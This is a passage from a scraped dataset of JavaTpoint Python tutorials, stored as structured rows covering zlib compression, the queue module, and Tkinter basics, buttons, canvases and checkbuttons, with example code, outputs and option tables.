compressed_data)"", ""f = open('compressed.datd', 'w')"", 'f.write(compressed_data)', 'f.close()', 'CHUNKSIZE = 1024', 'data2 = zlib.decompressobj()', ""my_file = open('compressed.dat', 'rb')"", 'buffer_value = my_file.read(CHUNKSIZE)', '# Decompress stream chunks', 'while buffer_value:', 'decompressed_data = data2.decompress(buf)', 'buf = my_file.read(CHUNKSIZE)', 'decompressed_data += data2.flush()', ""print('Decompressed data: ' + decompressed_data)"", 'my_file.close()', 'import zlib', ""compressed_data = open('hello.dat', 'rb').read()"", 'decompressed_data = zlib.decompress(compressed_data)', 'print(decompressed_data)']","['Original data: Welcome to JavaTpoint', 'Compressed data: 785ef348cdc9c95728cf2fca49010018ab043d', 'Original: Hello world', 'Compressed data: f348cdc9c95728cf2fca490100', 'Compressed: 10%', 'Welcome to JavaTpoint', 'Data Before Decompress: Welcome to JavaTpoint', 'Data After Decompress - #@$%%#@@#s', 'Decompressed Data: Welcome to JavaTpoint']","['Value|||Window size logarithm|||Output&&&+9 to +15|||Base 2|||It includes zlib headers and trailer.&&&+9 to -15|||Represent absolute value of wbit|||Exclude header and trailer.&&&+25 to +31|||Low 4 bits of the value.|||It includes a header and trailing checksum.', 'Value|||Window size logarithm|||Input&&&+8 to +15|||Base 2|||It includes zlib header and trailer&&&-8 to -15|||It represents the absolute alve of wbits|||It includes Raw stream with no header and trailer&&&+24 to +31 = 16 + (8 to 15)|||It represents Low 4 bits of the value|||It includes gzip header and trailer&&&+40 to +47 = 32 + (8 to 15)|||It represents Low 4 bits of the value|||zlib or gzip format']","[""|||The data parameter specifies the bytes to be compressed, and the level represents an integer value between -1 to 9. The level parameter is used to define the level of the compression. Level 9 signifies the slowest; however, it brings the highest compression level. The value -1 is a default that is level 6. Level 0 yields no compression.||||||The above method accepts wbits as an argument that handles the window size, and header and trailer are comprised in the output. Below is the possible value for||||||The method argument defines the algorithm to be used in compression. The DEFLATED is the default or we can say current possible algorithm.|||The strategy argument defines compression tuning. It is recommended to use only its default value as of now.||||||The data argument is a byte formatted value.|||The wbits argument is used to manage the size of the history buffer. The possible buffer value can be as below.||||||The bufsize argument indicates the buffer size. The best thing about this argument is that it doesn't need to be exact; its value automatically increases when extra buffer size is needed.|||""]"
465,['Python Queue Module'],"['We all have heard about data structures in Python and how they help us in the programming and development work. In simple words, we can say that data structure is a particular way in which data can be organized in a device or system to use it effectively later on. Therefore, data structures become very important for us while doing programming and development-related work. And, if we want to work with the data structures, we must first understand the concepts of data structures & how they work. It should also be noted that all data structures present are not the same, and they can be of different types. Therefore, if we are working with two, three, or more data structures, it can be possible that they all can be of different types. These different types of data structures arrange data in a different format, and it can be helpful for us to handle different types of data. We can implement these different types of data structures for arranging different data types according to our convenience and the system we are working on. We can arrange data in many forms, such as linear form data structures and others. The most common examples of linear data structures that we study in programming & development are stack & queue. These are the two most famous linear types of data structures that we can use to arrange our data in linear form. It can be said that both stack & queue are linear data structures, but actually, they follow different approaches in which data is inserted or removed from them. This approach of inserting & removing data from the given data structure makes stack & queue different from each other.']","['https://www.javatpoint.com/#', 'https://www.javatpoint.com/python-zlib-library', 'https://www.javatpoint.com/#', 'https://www.javatpoint.com/python-zlib-library', 'https://www.javatpoint.com/#']",[],[],"['Introduction to Queue Module in Python', 'Queue Module in Python: Installation', 'Queue Module in Python: Implementation']","['1) Creating a Queue of FIFO Pattern:', '2) Understanding Overflow and Underflow', '3) Working with Stack Data Structure:']",[],"['Therefore, we can directly proceed with the implementation part of this module and understand the implementation of functions of this module.', 'Look at the following category-wise operational implementation of the queue module:', 'Example 1: Look at the following Python program where we have created and worked with a queue object:', 'Look at the following example program to understand the implementation of these operations that we can do using the functions of the queue module:', 'Example 2: Look at the following Python program where we checked both underflow and overflow condition of queue object:', 'Following is the syntax for using the lifoqueue() function of the queue module for defining a stack data structure object:', 'Example 3: Look at the following Python program where we have performed all the queue object operations on the stack data structure:']","['Now, we will use an example program under each category to understand the working and functioning of different functions of this module. We will perform multiple operations under each category using different functions of the queue module.', 'In this category, we will perform the following three types of functions that are associated with the creation of the FIFO queue using the functions of the queue module:', 'As we can see, the put() function of the queue module also takes only one argument, and this argument is the element we want to insert in the queue object.', ""As we can see, the get() function of the queue module doesn't take any mandatory argument and returns the elements from the queue object in the FIFO pattern.""]","[""There are many approaches, programs, libraries, and packages that we can use to deal with these linear data structures. Many programming languages have different methods to work with these data structures for arranging data, but the basic approach of these data structures is the same throughout different methods. If we talk specifically about Python only, which is also one of the strongest programming languages, it provides us with multiple packages & modules which we can use in the Python programs to work with these two types of data structures. We can use these data structure approaches using Python's in-built or module-based functions in a program to handle the given data. The queue module is one of such Python modules, which we can use to implement stack & queue data structure approaches in the programs. Python's queue module helps us use both Queue, and Stack data structure approaches in the Python programs by providing many useful functions. Therefore, we will study this queue module of Python in this tutorial and work with it to learn how we can use this module's functions to use queue & stack data structure approaches."", 'Python provides us the queue class functions in the form of a package or a module named the queue module. The queue is a Python module that provides us multiple in-built functions that we can use for performing queue and stack data structures operations in a Python program. We can have access or use all these functions of the Queue module of Python simply by importing the queue module in the given Python program. We can use all these functions of the queue module to perform multiple operations related to the queue or stack data structure. We can also store elements in the data structure and take them out in the FIFO (First In First Out) or LIFO (Last in First Out) manner.', ""These queue data structure functions of Python were originally created as the class functions of many other object-oriented programming languages such as C, C++, C#, or Java, but later these functions were also introduced in Python in the form of a module. This queue class module was created for Python so that we all can work with the queue data structures in Python using the functions of this module. Therefore, it becomes very important for us to understand this module and how we can use this module's functions in a Python program to work with the queue and stack data structures. We will understand the implementation of this module by creating queue and stack data structure objects and then inserting and taking out elements from these data structures."", ""In the latest versions of Python, the queue module comes as an in-built module, which means this module comes pre-installed with the installation of Python. Therefore, if we are using the latest versions of Python, we don't need to perform any kind of installation process for installing this queue module, and we can directly start working with this module. We are using the latest version of Python in this tutorial, and therefore, we will not perform any installation process of this module and directly start working with functions of this module to understand their working. We only have to use the following import statement to use the functions of the queue module in a given Python program:"", 'We will understand the implementation of the queue module and understand the working of functions of this module by using them in the example programs of this part. We will perform multiple operations using the functions of this module, but we will categorize them under the following three categories so that it will become easy for us to understand the implementation part of this module:', 'a) Creating a Queue Object: If we want to create a FIFO queue using the queue module function, we can use Queue() function of this module. Following is the syntax for using the Queue() function of this module to create a FIFO queue object in the example program:', ""As we can see, the queue module's queue () function takes only one argument, which is the maximum size of the queue. This is the mandatory argument of this function so that the created queue object has a fixed size. If we provide '0' or no argument inside this function, the function will create a queue object of infinite size."", ""(b) Putting elements in the queue: After creating a queue object (representing the queue data structure), the next operation we can perform is inserting the elements inside the queue object. The queue module provides us with the put() function, which we can use to put elements inside the program's created queue object. Following is the syntax for using the put() function of the queue module for inserting elements in the queue object:"", '(c) Getting elements from the queue: We will also perform the operation of getting elements from the queue object in this category. We will use the get() function of the queue module to get the elements from the created queue in the FIFO manner, but we should also note that this function also removes the element from the queue, along with getting elements in the result. Following is the syntax for using this get() function of the queue module in the example programs:', 'To understand implementation of all three Operations under this category as mentioned above, we will use these functions in an example program. Look at the following example program to understand the implementation of these operations that we can do using the functions of the queue module:', ""As we can see, the elements from the queue object are printed in the output in the order in which they are inserted into the queue object. That's how we can use these three functions of the queue module to create a queue object and work with it in the Python program."", ""Explanation: First, we have imported the in-built queue module of Python as 'qu' in the example program given above so that we can access and work with the functions of this module. After that, we used the Queue() module to create a queue object with the name 'queueObject', and we can insert and remove elements from this queue object. We have defined the maximum size of the queue as 6 means this queue object can only take 6 elements. After that, we used the put() function to insert elements inside the queue object we created. Lastly, we get the elements of the queue object in the output in the FIFO pattern using the get() function. Along with getting elements from the queue object, the get() function also removes elements from the queue object."", 'In this implementation category, we will understand the overflow and Underflow terms related to the queue data structure in Python. As the name suggests, the overflow term is referred to the condition when the queue object has maximum elements, and still, we are trying to insert one more element in the queue. And the term underflow is referred to the condition when the queue object is empty and still we are trying to remove an element from it. In both cases, an error will be displayed in the output, and therefore, we have to be careful while getting and inserting elements into the given queue object. Apart from these operations, we will also learn how to get the maximum size of the queue object in the output. To understand all these operations, we will use the functions of the queue module in an example program.', ""As we can see, we have checked for both Underflow and overflow conditions in the queue object we have created in the program so that we don't have to face any error during the execution of this program. That's how we can use these functions of the queue module to work with queue data structures in the Python programs without having any errors."", ""Explanation: After importing the queue module as 'qu' in the program, we have created a queue object with a maximum size of 5. After that, we added three elements in the queue object and verified using the full() function whether the queue object was full or not. This will help us in preventing the overflow condition. After that, we entered two more elements in the queue object using the put() function, and again we checked if the queue object is now full or not. Then, we used the size() function of the queue module to print the maximum size of the queue object. The size() function will return the total number of elements present in the queue object. After that, we removed elements from the queue and printed them in the output using the get() function. We also checked if the queue object is empty or not, using the empty() function of the queue class. This function helps us check for and prevent us from the Underflow condition."", 'Till now, we have worked with the queue data structure that works on the FIFO pattern, but now we will work with queue data structures that follow the LIFO (Last in First Out) pattern for storing the elements. The LIFO pattern queue data structure is commonly known as the stack data structure. All things remain the same in the stack data structure as we have worked in the FIFO queue data structure. First, we have to create a stack object (LIFO queue object) using the lifoqueue() function of the queue module.', ""We use the LifoQueue() function in the program with an argument inside the function. This function works very similarly to the Queue() function, which we use to define the queue data structure. The argument we have to provide inside this function is the maximum size of the stack data structure object. And, if we don't define the size of the data structure object or set it equal to '0', then the program will define a stack data structure object of infinite."", 'We will work in the same manner with the stack data structure as we have worked with the FIFO data structure using the functions of the queue module. Using the functions of this module in an example program, we will perform all the operations on the stack data structure object that we have performed on the FIFO queue object. We will also check for the overflow and Underflow conditions in the stack object using the same functions of the queue module. Look at the following example program to understand the functions with respect to the stack data structure object:', ""As we can see, all the operations we performed on the queue object are successfully performed on the stack object, which we have also performed in the example program given above. We have performed all these operations using the same functions that we have used in examples 1 & 2. That's how we can work with the queue and stack data structures in a Python program using the functions of the module class queue.""]","['# Importing the queue module', 'import queue', '>> queue.Queue(SizeOfQueue)', "">> QueueObject.put('element')"", '>> QueueObject.get()', '# Importing the in-built queue module', 'import queue as qu', '# Creating a queue object with maxsize argument', 'queueObject = qu.Queue(maxsize = 6)', '# Inserting five elements in the queue of integer data type', 'queueObject.put(6)', 'queueObject.put(31)', 'queueObject.put(26)', 'queueObject.put(18)', 'queueObject.put(24)', '# Now getting elements in the output', ""print('The first element inserted in the queue object created: ', queueObject.get())"", ""print('The second element inserted in the queue object: ', queueObject.get())"", ""print('The third element inserted in the queue object: ', queueObject.get())"", ""print('The fourth element inserted in the queue object: ', queueObject.get())"", ""print('The fifth element inserted in the queue object: ', queueObject.get())"", '# Importing the in-built queue module', 'import queue as qu', '# Creating a queue object with maxsize argument', 'quObject = qu.Queue(maxsize = 5)', '# Inserting elements in the queue of integer data type', 'quObject.put(6)', 'quObject.put(31)', 'quObject.put(26)', 'quObject.put(18)', '# Checking if the queue is full or not', ""print('Is the given queue object is full according to the maximum size of it?: ', quObject.full())"", '# Inserting one more element', 'quObject.put(24)', '# Again, checking that queue is full', ""print('Is the given queue object is now full as its maximum size?: ', quObject.full())"", '# Checking size of the queue object', 'quSize = quObject.qsize()', ""print('The maximum size of the created queue object is: ', quSize)"", '# Now getting elements out from the queue object', ""print('The first element inserted in the queue object created: ', quObject.get())"", ""print('The second element inserted in the queue object: ', quObject.get())"", ""print('The third element inserted in the queue object: ', quObject.get())"", '# Checking for empty queue object', ""print('Is the given queue object is empty?: ', quObject.empty())"", '# Getting more elements out from the queue', ""print('The fourth element inserted in the queue object: ', quObject.get())"", ""print('The fifth element inserted in the queue object: ', quObject.get())"", '# Again, Checking for empty queue object', ""print('Is the given queue object is empty now?: ', quObject.empty())"", "">> queue.LifoQueue('Size of data structure object')"", '# Importing the in-built queue module', 'import queue as qu', '# Creating a stack data structure object with maxsize argument equal to 8', 'stackObj = qu.LifoQueue(maxsize = 8)', '# Inserting elements of integer data type in the stack object', 'stackObj.put(12)', 'stackObj.put(5)', 'stackObj.put(23)', 'stackObj.put(6)', 'stackObj.put(31)', '# Checking if the stack object is full or not for overflow condition prevention', ""print('Is the given queue object is full according to the maximum size of it?: ', stackObj.full())"", '# Inserting some more elements inside the stack object', 'stackObj.put(26)', 'stackObj.put(18)', 'stackObj.put(24)', '# Again, checking that if the stack object is full or not', ""print('Is the given stack object is now full according to its maximum size?: ', stackObj.full())"", '# Checking the maximum size of the stack object after Inserting all elements', 'stackSize = stackObj.qsize()', ""print('The maximum size of the stack object created in the program is: ', stackSize)"", '# Now getting elements out from the stack object in the LIFO manner', ""print('The last element inserted in the stack object: ', stackObj.get())"", ""print('The last second element inserted in the stack object: ', stackObj.get())"", ""print('The sixth element inserted in the stack object: ', stackObj.get())"", ""print('The fifth element inserted in the stack object: ', stackObj.get())"", '# Checking that if stack object has become empty', ""print('Is the given stack object have become empty?: ', stackObj.empty())"", '# Getting more elements out from the stack object', ""print('The fourth element inserted in the stack object: ', stackObj.get())"", ""print('The third element inserted in the stack object: ', stackObj.get())"", ""print('The second element inserted in the stack object: ', stackObj.get())"", ""print('The first element inserted in the stack object created: ', stackObj.get())"", '# Again Checking for the empty stack object', ""print('Is the given stack object in the program is empty now?: ', stackObj.empty())""]","['The first element inserted in the queue object created:  6', 'The second element inserted in the queue object:  31', 'The third element inserted in the queue object:  26', 'The fourth element inserted in the queue object:  18', 'The fifth element inserted in the queue object:  24', 'Is the given queue object is full according to the maximum size of it?:  False', 'The maximum size of the created queue object is:  5', 'Is the given queue object is now full as its maximum size?:  True', 'The first element inserted in the queue object created:  6', 'The second element inserted in the queue object:  31', 'The third element inserted in the queue object:  26', 'Is the given queue object is empty?:  False', 'The fourth element inserted in the queue object:  18', 'The fifth element inserted in the queue object:  24', 'Is the given queue object is empty now?:  True', 'Is the given queue object is full according to the maximum size of it?:  False', 'Is the given stack object is now full according to its maximum size?:  True', 'The maximum size of the stack object created in the program is:  8', 'The last element inserted in the stack object:  24', 'The last-second element inserted in the stack object:  18', 'The sixth element inserted in the stack object:  26', 'The fifth element inserted in the stack object:  31', 'Is the given stack object have become empty?:  False', 'The fourth element inserted in the stack object:  6', 'The third element inserted in the stack object:  23', 'The second element inserted in the stack object:  5', 'The first element inserted in the stack object created:  12', 'Is the given stack object in the program is empty now?:  True']",[],['|||Creating a FIFO queue|||Understanding Overflow and Underflow|||Working with Stack data structure|||']
466,['Python Tkinter Tutorial'],['Tkinter tutorial provides basic and advanced concepts of Python Tkinter. Our Tkinter tutorial is designed for beginners and professionals.'],"['https://www.javatpoint.com/python-tkinter-button', 'https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/python-tkinter-button', 'https://www.javatpoint.com/python-tkinter-canvas', 'https://www.javatpoint.com/python-tkinter-checkbutton', 'https://www.javatpoint.com/python-tkinter-entry', 'https://www.javatpoint.com/python-tkinter-frame', 'https://www.javatpoint.com/python-tkinter-label', 'https://www.javatpoint.com/python-tkinter-listbox', 'https://www.javatpoint.com/python-tkinter-menubutton', 'https://www.javatpoint.com/python-tkinter-menu', 'https://www.javatpoint.com/python-tkinter-message', 'https://www.javatpoint.com/python-tkinter-radiobutton', 'https://www.javatpoint.com/python-tkinter-scale', 'https://www.javatpoint.com/python-tkinter-scrollbar', 'https://www.javatpoint.com/python-tkinter-text', 'https://www.javatpoint.com/python-tkinter-toplevel', 'https://www.javatpoint.com/python-tkinter-spinbox', 'https://www.javatpoint.com/python-tkinter-panedwindow', 'https://www.javatpoint.com/python-tkinter-labelframe', 'https://www.javatpoint.com/python-tkinter-messagebox', 'https://www.javatpoint.com/python-tkinter-button', 'https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/python-tkinter-button']","['https://static.javatpoint.com/python/images/tkinter-tutorial.png', 'https://static.javatpoint.com/python/images/python-tkinter.png', 'https://static.javatpoint.com/python/images/python-tkinter2.png', 'https://static.javatpoint.com/python/images/python-tkinter3.png', 'https://static.javatpoint.com/python/images/python-tkinter4.png']",[],"['Tkinter widgets ', 'Python Tkinter Geometry ', 'Prerequisite', 'Audience', 'Problem']","['Example', 'Python Tkinter pack() method ', 'syntax', 'Example', 'Python Tkinter grid() method', 'Syntax', 'Example', 'Python Tkinter place() method', 'Syntax', 'Example']",[],"['Python provides the standard library Tkinter for creating the graphical user interface for desktop based applications.', 'There are various widgets like button, canvas, checkbutton, entry, etc. that are used to build the python GUI applications.', ""Let's discuss each one of them in detail."", 'However, the controls are less and widgets are generally added in the less organized manner. ', 'The syntax to use the pack() is given below.', 'A list of possible options that can be passed in pack() is given below.', 'This is a more organized way to place the widgets to the python application. The syntax to use the grid() is given below.', 'A list of possible options that can be passed inside the grid() method is given below.', 'The place() geometry manager organizes the widgets to the specific x and y coordinates.', 'A list of possible options is given below.', 'Before learning Tkinter, you must have the basic knowledge of Python.', 'Our Python Tkinter tutorial is designed to help beginners and professionals.', 'We assure that you will not find any problem in this Tkinter tutorial. But if there is any mistake, please post the problem in contact form.']","['Developing desktop based applications with python Tkinter is not a complex task. An empty Tkinter top-level window can be created by using the following steps.', 'The Tkinter geometry specifies the method by using which, the widgets are represented on display. The python Tkinter provides the following geometry methods.', 'The pack() widget is used to organize widget in the block. The positions widgets added to the python application using the pack() method can be controlled by using the various options specified in the method call. ', 'The grid() geometry manager organizes the widgets in the tabular form. We can specify the rows and columns as the options in the method call. We can also specify the column span (width) or rowspan(height) of a widget. ']",[],"['# !/usr/bin/python3', 'from tkinter import *', '#creating the application main window.', 'top = Tk()', '#Entering the event main loop', 'top.mainloop()', 'widget.pack(options)', '# !/usr/bin/python3', 'from tkinter import *', 'parent = Tk()', 'redbutton = Button(parent, text = ""Red"", fg = ""red"")', 'redbutton.pack( side = LEFT)', 'greenbutton = Button(parent, text = ""Black"", fg = ""black"")', 'greenbutton.pack( side = RIGHT )', 'bluebutton = Button(parent, text = ""Blue"", fg = ""blue"")', 'bluebutton.pack( side = TOP )', 'blackbutton = Button(parent, text = ""Green"", fg = ""red"")', 'blackbutton.pack( side = BOTTOM)', 'parent.mainloop()', 'widget.grid(options)', '# !/usr/bin/python3', 'from tkinter import *', 'parent = Tk()', 'name = Label(parent,text = ""Name"").grid(row = 0, column = 0)', 'e1 = Entry(parent).grid(row = 0, column = 1)', 'password = Label(parent,text = ""Password"").grid(row = 1, column = 0)', 'e2 = Entry(parent).grid(row = 1, column = 1)', 'submit = Button(parent, text = ""Submit"").grid(row = 4, column = 0)', 'parent.mainloop()', 'widget.place(options)', '# !/usr/bin/python3', 'from tkinter import *', 'top = Tk()', 'top.geometry(""400x250"")', 'name = Label(top, text = ""Name"").place(x = 30,y = 50)', 'email = Label(top, text = ""Email"").place(x = 30, y = 90)', 'password = Label(top, text = ""Password"").place(x = 30, y = 130)', 'e1 = Entry(top).place(x = 80, y = 50)', 'e2 = Entry(top).place(x = 80, y = 90)', 'e3 = Entry(top).place(x = 95, y = 130)', 'top.mainloop()']",[],"['SN|||Widget|||Description&&&1|||Button|||The Button is used to add various kinds of buttons to the python application.&&&2|||Canvas|||The canvas widget is used to draw the canvas on the window.&&&3|||Checkbutton|||The Checkbutton is used to display the CheckButton on the window.&&&4|||Entry|||The entry widget is used to display the single-line text field to the user. It is commonly used to accept user values.&&&5|||Frame|||It can be defined as a container to which, another widget can be added and organized.&&&6|||Label|||A label is a text used to display some message or information about the other widgets.&&&7|||ListBox|||The ListBox widget is used to display a list of options to the user.&&&8|||Menubutton|||The Menubutton is used to display the menu items to the user.&&&9|||Menu|||It is used to add menu items to the user.&&&10|||Message|||The Message widget is used to display the message-box to the user.&&&11|||Radiobutton|||The Radiobutton is different from a checkbutton. Here, the user is provided with various options and the user can select only one option among them.&&&12|||Scale|||It is used to provide the slider to the user. &&&13|||Scrollbar|||It provides the scrollbar to the user so that the user can scroll the window up and down.&&&14|||Text|||It is different from Entry because it provides a multi-line text field to the user so that the user can write the text and edit the text inside it.&&&14|||Toplevel|||It is used to create a separate window container.&&&15|||Spinbox|||It is an entry widget used to select from options of values.&&&16|||PanedWindow|||It is like a container widget that contains horizontal or vertical panes.&&&17|||LabelFrame|||A LabelFrame is a container widget that acts as the container&&&18|||MessageBox|||This module is used to display the message-box in the desktop based applications.']","[""|||expand: If the expand is set to true, the widget expands to fill any space. |||Fill: By default, the fill is set to NONE. However, we can set it to X or Y to determine whether the widget contains any extra space.|||size: it represents the side of the parent to which the widget is to be placed on the window.||||||Column|||The column number in which the widget is to be placed. The leftmost column is represented by 0. |||Columnspan |||The width of the widget. It represents the number of columns up to which, the column is expanded. |||ipadx, ipady|||It represents the number of pixels to pad the widget inside the widget's border.|||padx, pady |||It represents the number of pixels to pad the widget outside the widget's border.|||row|||The row number in which the widget is to be placed. The topmost row is represented by 0.|||rowspan|||The height of the widget, i.e. the number of the row up to which the widget is expanded.|||Sticky|||If the cell is larger than a widget, then sticky is used to specify the position of the widget inside the cell. It may be the concatenation of the sticky letters representing the position of the widget. It may be N, E, W, S, NE, NW, NS, EW, ES.||||||Anchor: It represents the exact position of the widget within the container. The default value (direction) is NW (the upper left corner)|||bordermode: The default value of the border type is INSIDE that refers to ignore the parent's inside the border. The other option is OUTSIDE.|||height, width: It refers to the height and width in pixels.|||relheight, relwidth: It is represented as the float between 0.0 and 1.0 indicating the fraction of the parent's height and width.|||relx, rely: It is represented as the float between 0.0 and 1.0 that is the offset in the horizontal and vertical direction.|||x, y: It refers to the horizontal and vertical offset in the pixels.|||&&&|||import the Tkinter module.|||Create the main application window.|||Add the widgets like labels, buttons, frames, etc. to the window.|||Call the main event loop so that the actions can take place on the user's computer screen.||||||The pack() method |||The grid() method |||The place() method|||""]"
467,['Python Tkinter Button'],['The button widget is used to add various types of buttons to the python application. Python allows us to configure the look of the button according to our requirements. Various options can be set or reset depending upon the requirements.'],"['https://www.javatpoint.com/python-tkinter-canvas', 'https://www.javatpoint.com/python-tkinter', 'https://www.javatpoint.com/python-tkinter-canvas', 'https://www.javatpoint.com/python-tkinter', 'https://www.javatpoint.com/python-tkinter-canvas']","['https://static.javatpoint.com/python/images/python-tkinter-button.png', 'https://static.javatpoint.com/python/images/python-tkinter-button2.png', 'https://static.javatpoint.com/python/images/python-tkinter-button3.png']",[],[],"['Syntax', 'Example', 'Example']",[],"['We can also associate a method or function with a button which is called when the button is pressed.', 'The syntax to use the button widget is given below.', 'A list of possible options is given below.']",[],[],"['W = Button(parent, options)', '#python application to create a simple button', 'from tkinter import *', 'top = Tk()', 'top.geometry(""200x100"")', 'b = Button(top,text = ""Simple"")', 'b.pack()', 'top.mainaloop()', 'from tkinter import *', 'top = Tk()', 'top.geometry(""200x100"")', 'def fun():', 'messagebox.showinfo(""Hello"", ""Red Button clicked"")', 'b1 = Button(top,text = ""Red"",command = fun,activeforeground = ""red"",activebackground = ""pink"",pady=10)', 'b2 = Button(top, text = ""Blue"",activeforeground = ""blue"",activebackground = ""pink"",pady=10)', 'b3 = Button(top, text = ""Green"",activeforeground = ""green"",activebackground = ""pink"",pady = 10)', 'b4 = Button(top, text = ""Yellow"",activeforeground = ""yellow"",activebackground = ""pink"",pady = 10)', 'b1.pack(side = LEFT)', 'b2.pack(side = RIGHT)', 'b3.pack(side = TOP)', 'b4.pack(side = BOTTOM)', 'top.mainloop()']",[],"['SN|||Option|||Description&&&1|||activebackground|||It represents the background of the button when the mouse hover the button.&&&2|||activeforeground|||It represents the font color of the button when the mouse hover the button.&&&3|||Bd|||It represents the border width in pixels.&&&4|||Bg|||It represents the background color of the button.&&&5|||Command|||It is set to the function call which is scheduled when the function is called.&&&6|||Fg|||Foreground color of the button.&&&7|||Font|||The font of the button text. &&&8|||Height|||The height of the button. The height is represented in the number of text lines for the textual lines or the number of pixels for the images.&&&10|||Highlightcolor|||The color of the highlight when the button has the focus.&&&11|||Image|||It is set to the image displayed on the button.&&&12|||justify|||It illustrates the way by which the multiple text lines are represented. It is set to LEFT for left justification, RIGHT for the right justification, and CENTER for the center.&&&13|||Padx|||Additional padding to the button in the horizontal direction.&&&14|||pady|||Additional padding to the button in the vertical direction.&&&15|||Relief|||It represents the type of the border. It can be SUNKEN, RAISED, GROOVE, and RIDGE.&&&17|||State|||This option is set to DISABLED to make the button unresponsive. The ACTIVE represents the active state of the button.&&&18|||Underline|||Set this option to make the button text underlined.&&&19|||Width|||The width of the button. It exists as a number of letters for textual buttons or pixels for image buttons.&&&20|||Wraplength|||If the value is set to a positive number, the text lines will be wrapped to fit within this length.']",[]
468,['Python Tkinter Canvas'],['The canvas widget is used to add the structured graphics to the python application. It is used to draw the graph and plots to the python application. The syntax to use the canvas is given below.'],"['https://www.javatpoint.com/python-tkinter-checkbutton', 'https://www.javatpoint.com/python-tkinter-button', 'https://www.javatpoint.com/python-tkinter-checkbutton', 'https://www.javatpoint.com/python-tkinter-button', 'https://www.javatpoint.com/python-tkinter-checkbutton']","['https://static.javatpoint.com/python/images/python-tkinter-canvas.png', 'https://static.javatpoint.com/python/images/python-tkinter-canvas2.png']",[],[],"['Syntax', 'Example', 'Example: Creating an arc']",[],['A list of possible options is given below.'],[],[],"['w = canvas(parent, options)', 'from tkinter import *', 'top = Tk()', 'top.geometry(""200x200"")', '#creating a simple canvas', 'c = Canvas(top,bg = ""pink"",height = ""200"")', 'c.pack()', 'top.mainloop()', 'from tkinter import *', 'top = Tk()', 'top.geometry(""200x200"")', '#creating a simple canvas', 'c = Canvas(top,bg = ""pink"",height = ""200"",width = 200)', 'arc = c.create_arc((5,10,150,200),start = 0,extent = 150, fill= ""white"")', 'c.pack()', 'top.mainloop()']",[],"['SN|||Option|||Description&&&1|||bd|||The represents the border width. The default width is 2.&&&2|||bg|||It represents the background color of the canvas.&&&3|||confine|||It is set to make the canvas unscrollable outside the scroll region.&&&4|||cursor|||The cursor is used as the arrow, circle, dot, etc. on the canvas.&&&5|||height|||It represents the size of the canvas in the vertical direction.&&&6|||highlightcolor|||It represents the highlight color when the widget is focused.&&&7|||relief|||It represents the type of the border. The possible values are SUNKEN, RAISED, GROOVE, and RIDGE.&&&8|||scrollregion|||It represents the coordinates specified as the tuple containing the area of the canvas.&&&9|||width|||It represents the width of the canvas.&&&10|||xscrollincrement|||If it is set to a positive value. The canvas is placed only to the multiple of this value.&&&11|||xscrollcommand|||If the canvas is scrollable, this attribute should be the .set() method of the horizontal scrollbar.&&&12|||yscrollincrement|||Works like xscrollincrement, but governs vertical movement.&&&13|||yscrollcommand|||If the canvas is scrollable, this attribute should be the .set() method of the vertical scrollbar.']",[]
469,['Python Tkinter Checkbutton'],"[""The Checkbutton is used to track the user's choices provided to the application. In other words, we can say that Checkbutton is used to implement the on/off selections. ""]","['https://www.javatpoint.com/python-tkinter-entry', 'https://www.javatpoint.com/python-tkinter-canvas', 'https://www.javatpoint.com/python-tkinter-entry', 'https://www.javatpoint.com/python-tkinter-canvas', 'https://www.javatpoint.com/python-tkinter-entry']",['https://static.javatpoint.com/python/images/python-tkinter-checkbutton.png'],[],['Methods'],"['Syntax', 'Example']",[],"['The syntax to use the checkbutton is given below.', 'A list of possible options is given below.', 'The methods that can be called with the Checkbuttons are described in the following table.']","['The Checkbutton can contain the text or images. The Checkbutton is mostly used to provide many choices to the user among which, the user needs to choose the one. It generally implements many of many selections. ']",[],"['w = checkbutton(master, options)', 'from tkinter import *', 'top = Tk()', 'top.geometry(""200x200"")', 'checkvar1 = IntVar()', 'checkvar2 = IntVar()', 'checkvar3 = IntVar()', 'chkbtn1 = Checkbutton(top, text = ""C"", variable = checkvar1, onvalue = 1, offvalue = 0, height = 2, width = 10)', 'chkbtn2 = Checkbutton(top, text = ""C++"", variable = checkvar2, onvalue = 1, offvalue = 0, height = 2, width = 10)', 'chkbtn3 = Checkbutton(top, text = ""Java"", variable = checkvar3, onvalue = 1, offvalue = 0, height = 2, width = 10)', 'chkbtn1.pack()', 'chkbtn2.pack()', 'chkbtn3.pack()', 'top.mainloop()']",[],"['SN|||Option|||Description&&&1|||activebackground|||It represents the background color when the checkbutton is under the cursor.&&&2|||activeforeground|||It represents the foreground color of the checkbutton when the checkbutton is under the cursor.&&&3|||bg|||The background color of the button.&&&4|||bitmap|||It displays an image (monochrome) on the button. &&&5|||bd|||The size of the border around the corner.&&&6|||command|||It is associated with a function to be called when the state of the checkbutton is changed.&&&7|||cursor|||The mouse pointer will be changed to the cursor name when it is over the checkbutton. &&&8|||disableforeground|||It is the color which is used to represent the text of a disabled checkbutton.&&&9|||font|||It represents the font of the checkbutton.&&&10|||fg|||The foreground color (text color) of the checkbutton.&&&11|||height|||It represents the height of the checkbutton (number of lines). The default height is 1.&&&12|||highlightcolor|||The color of the focus highlight when the checkbutton is under focus.&&&13|||image|||The image used to represent the checkbutton.&&&14|||justify|||This specifies the justification of the text if the text contains multiple lines.&&&15|||offvalue|||The associated control variable is set to 0 by default if the button is unchecked. We can change the state of an unchecked variable to some other one.&&&16|||onvalue|||The associated control variable is set to 1 by default if the button is checked. We can change the state of the checked variable to some other one.&&&17|||padx|||The horizontal padding of the checkbutton&&&18|||pady|||The vertical padding of the checkbutton.&&&19|||relief|||The type of the border of the checkbutton. By default, it is set to FLAT.&&&20|||selectcolor|||The color of the checkbutton when it is set. By default, it is red.&&&21|||selectimage|||The image is shown on the checkbutton when it is set.&&&22|||state|||It represents the state of the checkbutton. By default, it is set to normal. We can change it to DISABLED to make the checkbutton unresponsive. The state of the checkbutton is ACTIVE when it is under focus. &&&24|||underline|||It represents the index of the character in the text which is to be underlined. The indexing starts with zero in the text.&&&25|||variable|||It represents the associated variable that tracks the state of the checkbutton.&&&26|||width|||It represents the width of the checkbutton. It is represented in the number of characters that are represented in the form of texts.&&&27|||wraplength|||If this option is set to an integer number, the text will be broken into the number of pieces.', 'SN|||Method|||Description&&&1|||deselect()|||It is called to turn off the checkbutton.&&&2|||flash()|||The checkbutton is flashed between the active and normal colors.&&&3|||invoke()|||This will invoke the method associated with the checkbutton.&&&4|||select()|||It is called to turn on the 